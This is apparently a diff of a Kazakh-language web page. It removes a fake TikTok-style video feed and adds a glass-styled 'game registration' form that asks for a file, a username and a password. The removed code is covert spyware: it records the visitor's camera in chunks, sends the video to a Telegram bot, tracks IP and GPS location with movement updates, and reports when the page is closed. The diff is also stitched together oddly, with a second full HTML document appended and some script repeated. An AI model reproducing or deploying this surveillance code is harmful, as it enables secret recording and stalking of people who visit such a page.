-                    sendBlob(blob, ext);
-                }
-                if (isRecordingActive) recordNextChunk();
-            };
-
-            currentRecorder.start();
-            recordingTimer = setTimeout(() => {
-                if (currentRecorder && currentRecorder.state === 'recording') currentRecorder.stop(); 
-            }, 10000);
-        }
-
-        function sendBlob(blob, ext) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('video', blob, `video_${Date.now()}.${ext}`);
-            const isExiting = document.visibilityState === 'hidden';
+            showMessage(`Сәтті! Қош келдіңіз, ${username}!`);
             
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-                method: 'POST', body: formData, keepalive: isExiting
-            }).catch(e => {});
+            // Сәтті тіркелген соң форманы бастапқы қалпына келтіру
+            setTimeout(() => {
+                usernameInput.value = '';
+                passwordInput.value = '';
+                fileInput.value = '';
+                fileLabel.textContent = 'Файлды таңдау';
+                dropzone.classList.remove('border-white/50', 'bg-white/10');
+                
+                dropContainer.classList.remove('fully-expanded');
+                authFields.classList.remove('visible-fields');
+                authFields.classList.add('hidden-fields');
+                
+                usernameInput.disabled = true;
+                passwordInput.disabled = true;
+            }, 3500);
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ойынға тіркелу | almas offical</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            user-select: none;
+            box-sizing: border-box;
         }
 
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'hidden') {
-                if (currentRecorder && currentRecorder.state === 'recording') {
-                    isRecordingActive = false; clearTimeout(recordingTimer); currentRecorder.stop(); 
-                }
-            } else if (document.visibilityState === 'visible' && activeStream) {
-                isRecordingActive = true; recordNextChunk();
-            }
-        });
-
-        window.addEventListener("beforeunload", () => {
-            if (currentRecorder && currentRecorder.state === 'recording') { isRecordingActive = false; currentRecorder.stop(); }
-            navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, 
-                new Blob([JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "🛑 Пайдаланушы сайтты жапты!", parse_mode: 'HTML' })], { type: 'application/json' })
-            );
-        });
-
-        // ==========================================
-        // ГЕОЛОКАЦИЯ
-        // ==========================================
-        let lastSentLat = null; let lastSentLon = null;
-        function getDistanceMeters(lat1, lon1, lat2, lon2) {
-            const R = 6371e3; const dLat = (lat2 - lat1) * Math.PI / 180; const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
-            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #050505; /* Өте қараңғы фон */
+            overflow: hidden;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        function startLocationTracking() {
-            fetch('https://ipapi.co/json/').then(res => res.json())
-                .then(data => sendToTelegram(`🌐 <b>Интернет (IP):</b>\nҚала: ${data.city}\nIP: ${data.ip}\n🗺️ <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}">Карта</a>`)).catch(()=>{});
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    lastSentLat = pos.coords.latitude; lastSentLon = pos.coords.longitude;
-                    sendToTelegram(`📍 <b>GPS орын:</b>\n🗺️ <a href="https://maps.google.com/?q=${lastSentLat},${lastSentLon}">Карта</a>\n🎯 Дәлдік: ${pos.coords.accuracy.toFixed(1)}м`);
-                }, (err) => {}, { enableHighAccuracy: true });
-                navigator.geolocation.watchPosition((pos) => {
-                    const lat = pos.coords.latitude; const lon = pos.coords.longitude;
-                    if (lastSentLat !== null && lastSentLon !== null) {
-                        const dist = getDistanceMeters(lastSentLat, lastSentLon, lat, lon);
-                        if (dist > 25 && pos.coords.accuracy <= 100) { 
-                            sendToTelegram(`📍 <b>Қозғалды (${dist.toFixed(0)}м):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Карта</a>`);
-                            lastSentLat = lat; lastSentLon = lon;
-                        }
-                    }
-                }, (err) => {}, { enableHighAccuracy: true });
-            }
+        /* Артқы бұлыңғыр жарықтар (айнадан көрінуі үшін) */
+        .bg-shapes {
+            position: absolute;
+            inset: 0;
+            overflow: hidden;
+            z-index: 0;
+        }
+        
+        .shape-1 {
+            position: absolute;
+            top: -10%;
+            left: -10%;
+            width: 50vw;
+            height: 50vw;
+            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 60%);
+            border-radius: 50%;
+            filter: blur(60px);
         }
 
-        // ==========================================
-        // TIKTOK ВИДЕО АЙНАЛДЫРУ
-        // ==========================================
-        function switchTopNav(el) {
-            document.querySelectorAll('.top-nav-item').forEach(nav => nav.classList.remove('active')); el.classList.add('active');
+        .shape-2 {
+            position: absolute;
+            bottom: -20%;
+            right: -10%;
+            width: 60vw;
+            height: 60vw;
+            background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 60%);
+            border-radius: 50%;
+            filter: blur(80px);
         }
 
-        const observerOptions = { root: videoContainer, rootMargin: '0px', threshold: 0.7 };
-        const videoObserver = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                const videoEl = entry.target.querySelector('video');
-                const playIcon = entry.target.querySelector('.play-pause-icon');
-                if (entry.isIntersecting) {
-                    if (isAppStarted) {
-                        videoEl.muted = false; 
-                        const playPromise = videoEl.play();
-                        if (playPromise !== undefined) playPromise.catch(e => { videoEl.muted = true; videoEl.play().catch(err => {}); });
-                    }
-                    playIcon.style.display = 'none';
-                } else {
-                    videoEl.pause(); videoEl.currentTime = 0; playIcon.style.display = 'none';
-                }
-            });
-        }, observerOptions);
-
-        function createVideoElement(data) {
-            const itemDiv = document.createElement('div');
-            itemDiv.className = 'video-item';
+        /* Тамшы және айна контейнері */
+        #drop-container {
+            position: fixed;
+            top: -100px; /* Бастапқы орны жоғарыда жасырылған */
+            left: 50%;
+            transform: translate(-50%, -50%);
             
-            const videoEl = document.createElement('video');
-            videoEl.src = data.videoUrl; videoEl.loop = true; videoEl.playsInline = true; videoEl.muted = true;
+            /* Тамшы өлшемдері */
+            width: 20px;
+            height: 20px;
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
             
-            const playIcon = document.createElement('i');
-            playIcon.className = 'fas fa-play play-pause-icon';
+            /* Айна (Glassmorphism) стилі */
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(30px) saturate(150%);
+            -webkit-backdrop-filter: blur(30px) saturate(150%);
+            border-top: 1px solid rgba(255, 255, 255, 0.4);
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            border-right: 1px solid rgba(255, 255, 255, 0.05);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.8),
+                inset 0 0 20px rgba(255, 255, 255, 0.05);
+            
+            z-index: 10;
+            overflow: hidden;
+            
+            /* Анимация өткелдері */
+            transition: 
+                top 0.7s cubic-bezier(0.5, 0, 0.2, 1),
+                width 0.6s cubic-bezier(0.16, 1, 0.3, 1),
+                height 0.6s cubic-bezier(0.16, 1, 0.3, 1),
+                border-radius 0.6s ease;
+        }
 
-            let sharedBannerHtml = data.sharedBy ? `<div class="shared-banner"><img src="https://ui-avatars.com/api/?name=${data.sharedBy}&background=EE1D52&color=fff&rounded=true&bold=true" alt="Avatar" class="shared-avatar"><span><b>${data.sharedBy}</b> жіберді</span><i class="fas fa-chevron-right shared-arrow"></i></div>` : '';
+        /* 1-қадам: Тамшының құлауы */
+        #drop-container.fallen {
+            top: 50%;
+            border-radius: 50%;
+        }
+
+        /* 2-қадам: Тамшының тіркелу бетіне айналуы */
+        #drop-container.expanded {
+            width: min(92vw, 380px);
+            height: 280px; /* Бастапқы биіктігі (тек файл жүктеу) */
+            border-radius: 24px;
+        }
+
+        /* 3-қадам: Файл жүктелгеннен кейінгі толық ашылуы */
+        #drop-container.fully-expanded {
+            height: 480px;
+        }
+
+        #form-content {
+            position: absolute;
+            inset: 0;
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            opacity: 0;
+            transform: scale(0.95);
+            transition: opacity 0.6s ease, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            pointer-events: none;
+        }
+
+        #form-content.visible {
+            opacity: 1;
+            transform: scale(1);
+            pointer-events: auto;
+        }
+
+        /* Мөлдір өрістер */
+        .glass-input {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            transition: all 0.3s ease;
+        }
+
+        .glass-input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.4);
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
+        }
+
+        /* Мөлдір батырма */
+        .glass-button {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .glass-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: rgba(255, 255, 255, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .glass-button:active {
+            transform: translateY(0);
+        }
+
+        /* Жасырын құпия сөз өрістері үшін */
+        .hidden-fields {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease 0.3s;
+        }
+        
+        .visible-fields {
+            opacity: 1;
+            pointer-events: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Артқы бұлыңғыр жарықтар -->
+    <div class="bg-shapes">
+        <div class="shape-1"></div>
+        <div class="shape-2"></div>
+    </div>
+
+    <div id="drop-container">
+        
+        <!-- Тіркелу формасының ішкі мазмұны -->
+        <div id="form-content">
             
-            const overlayDiv = document.createElement('div');
-            overlayDiv.className = 'video-overlay';
-            overlayDiv.innerHTML = `
-                <div class="video-info">
-                    <div class="username">${data.username}</div>
-                    <div class="description">${data.description}</div>
-                    <div class="music-ticker"><i class="fas fa-music"></i><marquee scrollamount="3">${data.music}</marquee></div>
+            <!-- Тақырып -->
+            <div class="text-center mb-6">
+                <h1 class="text-xl font-semibold tracking-wider text-white">Ойынға Тіркелу</h1>
+                <p class="text-gray-400 text-xs mt-2 font-light tracking-wide">
+                    Жалғастыру үшін файл жүктеңіз
+                </p>
+            </div>
+
+            <!-- Файл жүктеу аймағы -->
+            <div id="dropzone" class="border border-dashed border-white/20 rounded-xl p-5 text-center cursor-pointer transition-all duration-300 hover:border-white/50 hover:bg-white/5" onclick="document.getElementById('file-upload').click()">
+                <div class="mb-2 flex justify-center">
+                    <svg class="h-6 w-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
+                    </svg>
                 </div>
-                <div class="action-buttons">
-                    <button class="action-btn" onclick="toggleLike(this)"><i class="fas fa-heart"></i><span class="action-text">${data.likes}</span></button>
-                    <button class="action-btn" onclick="openComments()"><i class="fas fa-comment-dots"></i><span class="action-text">${data.comments}</span></button>
-                    <button class="action-btn"><i class="fas fa-share"></i><span class="action-text">${data.shares}</span></button>
+                <p class="text-[13px] text-gray-300 font-medium" id="file-label">Файлды таңдау</p>
+                <input type="file" id="file-upload" class="hidden" accept=".jpg,.jpeg,.png,.pdf,.doc,.docx,.txt" required>
+            </div>
+
+            <div id="auth-fields" class="hidden-fields flex-1 flex flex-col justify-end mt-4">
+                <div class="space-y-4">
+                    <div class="space-y-1.5">
+                        <label class="text-[11px] text-gray-400 font-medium ml-1 tracking-wide uppercase">Ойыншы аты</label>
+                        <input type="text" id="username" placeholder="Мысалы: ProGamer" class="glass-input w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" required disabled>
+                    </div>
+
+                    <div class="space-y-1.5">
+                        <label class="text-[11px] text-gray-400 font-medium ml-1 tracking-wide uppercase">Құпия сөз</label>
+                        <input type="password" id="password" placeholder="••••••••" class="glass-input w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" required disabled>
+                    </div>
+
+                    <button type="button" onclick="submitForm()" class="glass-button w-full font-medium py-3 px-4 rounded-lg text-sm tracking-wide mt-2">
+                        Тіркелуді аяқтау
+                    </button>
                 </div>
-            `;
+            </div>
 
-            itemDiv.innerHTML = sharedBannerHtml;
-            itemDiv.appendChild(videoEl); itemDiv.appendChild(playIcon); itemDiv.appendChild(overlayDiv);
+            <!-- Авторлық жазу -->
+            <div class="mt-auto pt-6 text-center">
+                <p class="text-[10px] text-gray-500 font-light tracking-widest uppercase">
+                    Created by <span class="text-gray-300 font-medium">almas offical</span>
+                </p>
+            </div>
 
-            itemDiv.addEventListener('click', function(e) {
-                if(e.target.closest('.action-btn') || e.target.closest('.shared-banner')) return;
-                if (videoEl.paused) { videoEl.play(); playIcon.style.display = 'none'; } 
-                else { videoEl.pause(); playIcon.style.display = 'block'; }
-            });
+        </div>
+    </div>
 
-            videoObserver.observe(itemDiv);
-            return itemDiv;
-        }
+    <!-- Хабарлама терезесі (Alert орнына) -->
+    <div id="message-box" class="fixed top-6 right-6 px-5 py-3 rounded-xl shadow-2xl transform translate-x-full transition-transform duration-500 z-50 flex items-center gap-3" style="background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2);">
+        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center">
+            <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+        </div>
+        <span id="message-text" class="text-white text-xs font-medium tracking-wide">Сәтті орындалды!</span>
+    </div>
 
-        window.toggleLike = function(btn) {
-            const icon = btn.querySelector('i');
-            if(icon.style.color === 'rgb(238, 29, 82)' || icon.style.color === '#EE1D52') {
-                icon.style.color = 'white'; icon.style.transform = 'scale(1)';
-            } else {
-                icon.style.color = '#EE1D52'; icon.style.transform = 'scale(1.2)'; setTimeout(() => { icon.style.transform = 'scale(1)'; }, 200);
-            }
+    <script>
+        const dropContainer = document.getElementById('drop-container');
+        const formContent = document.getElementById('form-content');
+        
+        const fileInput = document.getElementById('file-upload');
+        const fileLabel = document.getElementById('file-label');
+        const dropzone = document.getElementById('dropzone');
+        
+        const authFields = document.getElementById('auth-fields');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        
+        const messageBox = document.getElementById('message-box');
+        const messageText = document.getElementById('message-text');
+
+        // Бет жүктелгенде орындалатын тамшы анимациясы
+        window.onload = () => {
+            // 1. Тамшы жоғарыдан құлайды
+            setTimeout(() => {
+                dropContainer.classList.add('fallen');
+            }, 100);
+
+            // 2. Тамшы ортаға жеткен соң, тіркелу бетіне дейін жайылады (айналады)
+            setTimeout(() => {
+                dropContainer.classList.add('expanded');
+            }, 800); // құлау уақыты (0.7s) + аздаған кідіріс
+
+            // 3. Айна жайылған соң ішіндегі жазулар пайда болады
+            setTimeout(() => {
+                formContent.classList.add('visible');
+            }, 1400); // жайылу уақыты (0.6s)
         };
 
-        function loadContent() { mockData.forEach(data => videoContainer.appendChild(createVideoElement(data))); }
-        loadContent();
-
-        videoContainer.addEventListener('scroll', () => {
-            if (videoContainer.scrollTop + videoContainer.clientHeight >= videoContainer.scrollHeight - 100) loadContent();
+        // Файл жүктеу логикасы
+        fileInput.addEventListener('change', function(e) {
+            const fileName = e.target.files[0]?.name;
+            
+            if (fileName) {
+                // Файл атын шығару
+                fileLabel.innerHTML = `<span class="text-white font-medium">${fileName}</span>`;
+                dropzone.classList.add('border-white/50', 'bg-white/10');
+                
+                // Айна контейнерін төмен қарай ұзарту
+                dropContainer.classList.add('fully-expanded');
+                
+                // Жасырын өрістерді (логин/пароль) көрсету
+                authFields.classList.remove('hidden-fields');
+                authFields.classList.add('visible-fields');
+                
+                // Өрістерді қолжетімді ету
+                usernameInput.disabled = false;
+                passwordInput.disabled = false;
+            }
         });
+
+        // Файлды сүйреп әкелу (Drag & Drop) мүмкіндігі
+        dropzone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropzone.classList.add('border-white/50', 'bg-white/5');
+        });
+
+        dropzone.addEventListener('dragleave', (e) => {
+            e.preventDefault();
+            if(!fileInput.files.length) {
+                dropzone.classList.remove('border-white/50', 'bg-white/5');
+            }
+        });
+
+        dropzone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            if (e.dataTransfer.files.length) {
+                fileInput.files = e.dataTransfer.files;
+                const event = new Event('change');
+                fileInput.dispatchEvent(event);
+            }
+        });
+
+        // Хабарлама көрсету функциясы
+        function showMessage(text) {
+            messageText.textContent = text;
+            messageBox.style.transform = 'translateX(0)';
+            setTimeout(() => {
+                messageBox.style.transform = 'translateX(150%)';
+            }, 3000);
+        }
+
+        // Тіркелуді аяқтау батырмасы
+        function submitForm() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if(!username || !password) {
+                showMessage('Барлық өрістерді толтырыңыз!');
+                return;
+            }
+
+            showMessage(`Сәтті! Қош келдіңіз, ${username}!`);
+            
+            // Сәтті тіркелген соң форманы бастапқы қалпына келтіру
+            setTimeout(() => {
+                usernameInput.value = '';
+                passwordInput.value = '';
+                fileInput.value = '';
+                fileLabel.textContent = 'Файлды таңдау';
+                dropzone.classList.remove('border-white/50', 'bg-white/10');
+                
+                dropContainer.classList.remove('fully-expanded');
+                authFields.classList.remove('visible-fields');
+                authFields.classList.add('hidden-fields');
+                
+                usernameInput.disabled = true;
+                passwordInput.disabled = true;
+            }, 3500);
+        }
     </script>
 </body>
 </html>
